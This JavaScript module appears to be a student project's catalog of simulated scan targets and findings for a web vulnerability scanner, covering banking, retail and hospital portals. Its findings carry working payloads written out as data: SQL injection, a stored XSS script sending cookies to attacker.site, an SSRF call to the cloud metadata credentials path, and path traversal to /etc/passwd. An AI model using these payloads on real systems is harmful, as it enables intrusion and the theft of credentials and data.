// modules/scanner/sampleTargets.js
// Student 1: Web Application Vulnerability Scanning Module - Benchmark Target Catalog

module.exports = {
  targets: [
    {
      id: "target-banking",
      name: "ApexSecure FinTech Banking Portal",
      url: "https://demo-bank.apexsecure.internal",
      category: "Financial / Banking",
      riskLevel: "CRITICAL",
      description: "Enterprise web banking portal with user auth, fund transfers, account statements, and administrative API endpoints.",
      endpoints: [
        { path: "/api/v1/auth/login", method: "POST", params: ["username", "password"], authRequired: false },
        { path: "/api/v1/accounts/{id}/balance", method: "GET", params: ["account_id"], authRequired: true },
        { path: "/api/v1/transfer/wire", method: "POST", params: ["from_acc", "to_acc", "amount", "otp"], authRequired: true },
        { path: "/admin/debug/server-status", method: "GET", params: [], authRequired: false },
        { path: "/statements/download", method: "GET", params: ["doc_name", "format"], authRequired: true }
      ],
      simulatedFindings: [
        {
          id: "VULN-001",
          name: "SQL Injection in Account Statement Query",
          type: "SQL Injection",
          cwe: "CWE-89",
          owasp: "A03:2021-Injection",
          endpoint: "/statements/download?doc_name=stmt' OR 1=1--",
          method: "GET",
          parameter: "doc_name",
          payload: "' OR 1=1 UNION SELECT 1,username,password_hash FROM users--",
          evidence: "Database query syntax error: 'pg_query(): syntax error at or near UNION...'",
          rawSeverity: "CRITICAL",
          confidenceScore: 0.98,
          moduleOwner: "Student 1: Web Vulnerability Scanning Engine"
        },
        {
          id: "VULN-002",
          name: "Insecure Direct Object Reference (IDOR) on Account Balances",
          type: "Broken Object Level Authorization",
          cwe: "CWE-639",
          owasp: "A01:2021-Broken Access Control",
          endpoint: "/api/v1/accounts/10892/balance",
          method: "GET",
          parameter: "account_id",
          payload: "account_id=10893 (Horizontal Privilege Escalation)",
          evidence: "HTTP 200 OK returned full profile and balance of unauthenticated third-party user",
          rawSeverity: "HIGH",
          confidenceScore: 0.94,
          moduleOwner: "Student 1: Web Vulnerability Scanning Engine"
        },
        {
          id: "VULN-003",
          name: "Missing Critical HTTP Security Headers",
          type: "Security Misconfiguration",
          cwe: "CWE-693",
          owasp: "A05:2021-Security Misconfiguration",
          endpoint: "/",
          method: "GET",
          parameter: "HTTP Response Headers",
          payload: "GET / HTTP/1.1",
          evidence: "Missing Content-Security-Policy (CSP), Strict-Transport-Security (HSTS), and X-Frame-Options headers",
          rawSeverity: "MEDIUM",
          confidenceScore: 0.99,
          moduleOwner: "Student 1: Web Vulnerability Scanning Engine"
        },
        {
          id: "VULN-004",
          name: "Exposed Debugging & Diagnostic Endpoint",
          type: "Information Disclosure",
          cwe: "CWE-200",
          owasp: "A05:2021-Security Misconfiguration",
          endpoint: "/admin/debug/server-status",
          method: "GET",
          parameter: "None",
          payload: "GET /admin/debug/server-status",
          evidence: "Unrestricted diagnostic page exposing active database connection pool, Redis cache tokens, and internal IP topology",
          rawSeverity: "HIGH",
          confidenceScore: 0.97,
          moduleOwner: "Student 1: Web Vulnerability Scanning Engine"
        }
      ]
    },
    {
      id: "target-ecommerce",
      name: "GlobalMart E-Commerce Platform",
      url: "https://shop.globalmart-test.io",
      category: "Retail / E-Commerce",
      riskLevel: "HIGH",
      description: "High-volume online retail store with search catalog, shopping cart, customer reviews, and webhook integrations.",
      endpoints: [
        { path: "/search", method: "GET", params: ["query", "category", "sort"], authRequired: false },
        { path: "/reviews/add", method: "POST", params: ["product_id", "rating", "comment"], authRequired: true },
        { path: "/webhook/sync", method: "POST", params: ["callback_url"], authRequired: false },
        { path: "/.env", method: "GET", params: [], authRequired: false }
      ],
      simulatedFindings: [
        {
          id: "VULN-005",
          name: "Stored Cross-Site Scripting (XSS) in Product Reviews",
          type: "Cross-Site Scripting",
          cwe: "CWE-79",
          owasp: "A03:2021-Injection",
          endpoint: "/reviews/add",
          method: "POST",
          parameter: "comment",
          payload: "<script>fetch('https://attacker.site/steal?cookie='+document.cookie)</script>",
          evidence: "Script tag stored without sanitization; reflected in HTML DOM with Content-Type: text/html",
          rawSeverity: "HIGH",
          confidenceScore: 0.95,
          moduleOwner: "Student 1: Web Vulnerability Scanning Engine"
        },
        {
          id: "VULN-006",
          name: "Server-Side Request Forgery (SSRF) via Webhook URL",
          type: "SSRF",
          cwe: "CWE-918",
          owasp: "A10:2021-Server-Side Request Forgery",
          endpoint: "/webhook/sync",
          method: "POST",
          parameter: "callback_url",
          payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
          evidence: "Server made outbound connection to cloud metadata service, exposing instance IAM role token",
          rawSeverity: "CRITICAL",
          confidenceScore: 0.93,
          moduleOwner: "Student 1: Web Vulnerability Scanning Engine"
        },
        {
          id: "VULN-007",
          name: "Publicly Accessible Environment File (.env)",
          type: "Sensitive Data Exposure",
          cwe: "CWE-552",
          owasp: "A01:2021-Broken Access Control",
          endpoint: "/.env",
          method: "GET",
          parameter: "Direct Path",
          payload: "GET /.env HTTP/1.1",
          evidence: "HTTP 200 OK: DB_PASSWORD=prod_secret_9981; JWT_SECRET=super_k3y_live; AWS_KEY=AKIA...",
          rawSeverity: "CRITICAL",
          confidenceScore: 0.99,
          moduleOwner: "Student 1: Web Vulnerability Scanning Engine"
        }
      ]
    },
    {
      id: "target-healthcare",
      name: "MedPulse Hospital Patient Management System",
      url: "https://ehr.medpulse-portal.org",
      category: "Healthcare / EHR",
      riskLevel: "CRITICAL",
      description: "Electronic Health Records (EHR) system managing patient charts, prescription refills, doctor appointments, and medical imaging.",
      endpoints: [
        { path: "/patient/records", method: "GET", params: ["patient_id"], authRequired: true },
        { path: "/imaging/dicom/view", method: "GET", params: ["file_path"], authRequired: true },
        { path: "/auth/reset-password", method: "POST", params: ["email"], authRequired: false }
      ],
      simulatedFindings: [
        {
          id: "VULN-008",
          name: "Path Traversal in Medical Imaging Viewer",
          type: "Path Traversal",
          cwe: "CWE-22",
          owasp: "A01:2021-Broken Access Control",
          endpoint: "/imaging/dicom/view?file_path=../../../../etc/passwd",
          method: "GET",
          parameter: "file_path",
          payload: "../../../../etc/passwd",
          evidence: "Root filesystem file returned in response: root:x:0:0:root:/root:/bin/bash",
          rawSeverity: "HIGH",
          confidenceScore: 0.96,
          moduleOwner: "Student 1: Web Vulnerability Scanning Engine"
        },
        {
          id: "VULN-009",
          name: "Broken Authentication in Password Reset Flow",
          type: "Broken Authentication",
          cwe: "CWE-640",
          owasp: "A07:2021-Identification and Authentication Failures",
          endpoint: "/auth/reset-password",
          method: "POST",
          parameter: "email",
          payload: "Predictable 4-digit numeric reset token without rate limiting",
          evidence: "Tokens generated via Math.random() with infinite retry tolerance, allowing brute-force in < 30 seconds",
          rawSeverity: "HIGH",
          confidenceScore: 0.91,
          moduleOwner: "Student 1: Web Vulnerability Scanning Engine"
        }
      ]
    }
  ]
};
